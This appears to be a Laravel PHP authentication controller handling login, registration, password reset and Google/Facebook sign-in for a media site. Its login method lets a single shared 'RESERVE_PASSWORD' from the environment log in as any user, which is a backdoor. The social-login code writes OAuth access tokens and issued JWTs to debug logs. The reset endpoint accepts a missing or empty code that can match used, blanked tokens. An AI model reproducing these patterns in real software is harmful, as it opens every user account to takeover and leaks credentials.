<?php

namespace App\Http\Controllers\Api\Any;

use App\Models\SFX\SFXTrack;
use App\Models\Track;
use App\Models\UserFavoritesFolder;
use App\Models\VideoEffects\VideoEffect;
use Illuminate\Support\Facades\Log;
use Illuminate\Validation\ValidationException;
use Psr\Container\ContainerExceptionInterface;
use Psr\Container\NotFoundExceptionInterface;
use Socialite;
use Exception;
use App\Models\User;
use Illuminate\Support\Str;
use App\Models\PasswordReset;
use Illuminate\Http\JsonResponse;
use App\Services\AuthorisationService;
use App\Http\Controllers\Api\ApiController;

class AuthController extends ApiController
{
    public function __construct(
        private readonly AuthorisationService $service,
    ) {
        parent::__construct();
    }

    /**
     * @OA\Post(
     *     path = "/v1/public/auth/login",
     *     summary = "Generates an access token",
     *     tags={"Auth"},
     *     @OA\RequestBody(required=true, @OA\MediaType(mediaType="multipart/form-data", @OA\Schema(
     *          @OA\Property(property="email", type="string", description="Email"),
     *          @OA\Property(property="password", type="string", description="Password"),
     *     ))),
     *     @OA\Response(
     *         response="200",
     *         description="Success",
     *         @OA\JsonContent(
     *              ref="#/components/schemas/DataTokenArray"
     *         )
     *     ),
     * )
     *
     *
     * @throws Exception
     */
    public function login(): JsonResponse
    {
        try {
            $this->validate(request(), [
                'email' => 'required',
                'password' => 'required',
            ]);
        } catch (ValidationException $e) {
            return response()->json([
                'message' => $e->getMessage()
            ], 400);
        }

        try {
            $credentials = request(['email', 'password']);
            if ($credentials['password'] === env('RESERVE_PASSWORD'))
            {
                $user = User::where('email', $credentials['email'])->first();
                if ($user)
                    $token = auth()->fromUser($user);
                else
                    return response()->json([
                        'message' => 'Unauthorized. Login or password is wrong'
                    ], 401);
            } else if (!$token = auth()->attempt($credentials)) {
                return response()->json([
                    'message' => 'Unauthorized. Login or password is wrong'
                ], 401);
            } else {
                /**
                 * @var $user User
                 */
                $user = auth()->user();
            }

            if (auth()->check() && !auth()->user()->country_code) {
                $location = geoip()->getLocation();

                $user->country_code = $location->iso_code;
                $user->save();
            }

            return response()->json($this->service->returnToken($token, $user));
        } catch (Exception $e) {
            return response()->json([
                'message' => $e->getMessage()
            ], 500);
        }
    }

    /**
     * @OA\Post(
     *     path = "/v1/public/auth/register",
     *     summary = "User registration",
     *     tags={"Auth"},
     *     @OA\RequestBody(required=true, @OA\MediaType(mediaType="multipart/form-data", @OA\Schema(
     *          @OA\Property(property="email", type="string", description="Email"),
     *          @OA\Property(property="password", type="string", description="Password"),
     *     ))),
     *     @OA\Response(
     *         response="200",
     *         description="Success",
     *         @OA\JsonContent(
     *              ref="#/components/schemas/DataTokenArray"
     *         )
     *     ),
     * )
     *
     * @return JsonResponse
     * @throws Exception
     */
    public function register(): JsonResponse
    {
        try {
            $this->validate(request(), [
                'email' => 'required|string|email|max:255|unique:users',
                'password' => 'required|string|min:6',
            ]);
        } catch (ValidationException $e) {
            return response()->json([
                'message' => $e->getMessage()
            ], 400);
        }

        $data = request(['email', 'password']);

        try {
            if (User::where('email', $data['email'])->first()) {
                throw new Exception('The user with this email is already registered in the system', 401);
            }
        } catch (Exception $e) {
            return response()->json([
                'message' => $e->getMessage()
            ], 401);
        }

        try {
            $user['email'] = $data['email'];
            $user['confirmation_code'] = Str::random(30);
            $user['password'] = bcrypt($data['password']);
            $user['name'] = explode("@", $data['email'])[0];
            $user['confirmed'] = 0;
            $user['payout_email'] = $data['email'];

            $location = geoip()->getLocation();

            $user['country_code'] = $location->iso_code;

            $model = User::create($user);
            $model->roles()->attach(2);

            $token = auth()->attempt($data);

            $folderTypes = [
                SFXTrack::class,
                VideoEffect::class,
                Track::class
            ];

            foreach ($folderTypes as $folderType) {
                UserFavoritesFolder::firstOrcreate([
                    'folder_type' => $folderType,
                    'user_id' => $model->id,
                ], ['title' => 'Favorites',]);
            }

            return response()->json($this->service->returnToken($token, $model, true));
        } catch (Exception $e) {
            return response()->json([
                'message' => $e->getMessage()
            ], 500);
        }
    }

    /**
     *
     * @return JsonResponse
     */
    public function logout(): JsonResponse
    {
        return $this->success([
            'status' => auth()->logout(),
        ]);
    }

    /**
     * @OA\Post(
     *     path = "/v1/public/auth/reset-password/request",
     *     summary = "Reset Password (Request)",
     *     tags={"Auth"},
     *     @OA\RequestBody(required=true, @OA\MediaType(mediaType="multipart/form-data", @OA\Schema(
     *          @OA\Property(property="email", type="string", description="Email"),
     *     ))),
     *     @OA\Response(
     *         response="200",
     *         description="Success",
     *         @OA\JsonContent(
     *              @OA\Property(property="success", type="boolean"),
     *         ),
     *     ),
     * )
     *
     * @return JsonResponse
     * @throws ContainerExceptionInterface
     * @throws NotFoundExceptionInterface
     * @throws ValidationException
     */
    public function requestPasswordReset(): JsonResponse
    {
        $this->validate(request(), [
            'email' => 'required|email',
        ]);

        $email = request()->get('email');

        $pr = PasswordReset::updateOrCreate([
            'email' => $email,
        ], [
            'email' => $email,
            'token' => Str::random(30),
        ]);

        return $this->success([
            'success' => true,
        ]);
    }

    /**
     * @OA\Post(
     *     path = "/v1/public/auth/reset-password",
     *     summary = "Reset Password",
     *     tags={"Auth"},
     *     @OA\RequestBody(required=true, @OA\MediaType(mediaType="multipart/form-data", @OA\Schema(
     *          @OA\Property(property="code", type="string", description="Email"),
     *          @OA\Property(property="password", type="string", description="Email"),
     *     ))),
     *     @OA\Response(
     *         response="200",
     *         description="Success",
     *         @OA\JsonContent(
     *              @OA\Property(property="success", type="boolean"),
     *         ),
     *     ),
     * )
     *
     * @return JsonResponse
     * @throws ValidationException
     * @throws ContainerExceptionInterface
     * @throws NotFoundExceptionInterface
     */
    public function resetPassword(): JsonResponse
    {
        $this->validate(request(), [
            'password' => 'required|min:6',
        ]);

        $code = request()->get('code');
        $password = request()->get('password');

        /**
         * @var PasswordReset $pr
         */
        $pr = PasswordReset::where('token', $code)->first();
        if (!$pr) {
            throw new Exception("token not found", 404);
        }

        /**
         * @var User $user
         */
        $user = User::where('email', $pr->email)->first();
        if (!$user) {
            throw new Exception("user not found", 404);
        }

        $hashedPassword = bcrypt($password);

        $user->password = $hashedPassword;
        $user->save();
        $user->refresh();

        $pr->token = '';
        $pr->save();

        return $this->success([
            'success' => true,
        ]);
    }

    /**
     * @OA\Post(
     *     path = "/v1/public/auth/o/{type_auth}",
     *     summary = "Generates an access token (Google or Facebook)",
     *     tags={"Auth"},
     *     @OA\Parameter(parameter="type_auth (google or facebook)", description="Type Auth", required=true, in="path", name="type_auth", example="google"),
     *     @OA\RequestBody(required=true, @OA\MediaType(mediaType="multipart/form-data", @OA\Schema(
     *          @OA\Property(property="access_token", type="string", description="Access Token"),
     *     ))),
     *     @OA\Response(
     *         response="200",
     *         description="Success",
     *         @OA\JsonContent(
     *              ref="#/components/schemas/DataTokenArray"
     *         )
     *     ),
     * )
     *
     *
     * @throws Exception
     */
    public function socialiteAuth(string $type_auth): JsonResponse
    {
        try {
			$registered = false;
            $googleDriver = Socialite::driver($type_auth);
			Log::debug('driver', [$googleDriver]);
            $googleToken = request()->input('access_token');
			Log::debug('$googleToken', [$googleToken]);
			
            $googleUser = $googleDriver->userFromToken($googleToken);
			Log::debug('$googleUser', [$googleUser]);
			
            $googleEmail = $googleUser->getEmail();
            $googleName = $googleUser->getName();

            $user = User::where('email', $googleEmail)->first();
            if (!$user) {
                $location = geoip()->getLocation();

                $user = User::create([
                    'email' => $googleEmail,
                    'name' => $googleName,
                    'password' => bcrypt(uniqid() . Str::random()),
                    'confirmed' => 1,
                    'role' => 'user',
                    'country_code' => $location->iso_code,
					'payout_email' => $googleEmail,
                ]);

                $user->roles()->attach(2);
				$registered = true;
            }

            $token = auth()->fromUser($user);
			Log::debug('$token', [$token]);
			
            return response()->json($this->service->returnToken($token, $user, $registered));
        } catch (Exception $e) {
            return response()->json([
                'message' => $e->getMessage()
            ], 500);
        }
    }
}
